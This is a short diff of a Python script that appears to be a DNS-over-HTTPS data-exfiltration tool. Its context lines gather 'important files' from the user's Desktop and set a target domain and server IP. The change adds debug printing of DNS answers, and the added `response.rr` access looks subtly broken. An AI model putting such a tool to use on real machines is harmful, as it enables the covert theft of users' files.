@@ -54,7 +54,16 @@ def doh_query(domain, doh_url):
         response = client.get(full_url, headers=headers)
         response.raise_for_status()
         data = response.content
-        return decode_dns_response(data)  
+        print("\n[-] Response Data : ",data)
+        for answer in response.rr:
+            print(f"[*] Answer section:")
+            print(f"\t  [+] Name: {answer.rname}")
+            print(f"\t  [+] Type: {answer.rtype}")
+            print(f"\t  [+] TTL: {answer.ttl}")
+            print(f"\t  [+] LENGTH: {len(answer.rdata.data)}")
+            print(f"\t  [+] IP Address: {answer.rdata}\n")
+        return decode_dns_response(data)
+
 
 def get_important_files(directory, number_of_files):
     print(f"{Fore.CYAN}[ * ] Fetching important files from {directory}")
@@ -112,6 +121,7 @@ if __name__ == "__main__":
 
     desktop_dir = os.path.join(os.path.expanduser("~"), "Desktop")
     important_files = get_important_files(desktop_dir, 5)
+
 
     domain = "everythingBlackkk.com"  
     server_ip = "192.168.1.6" 
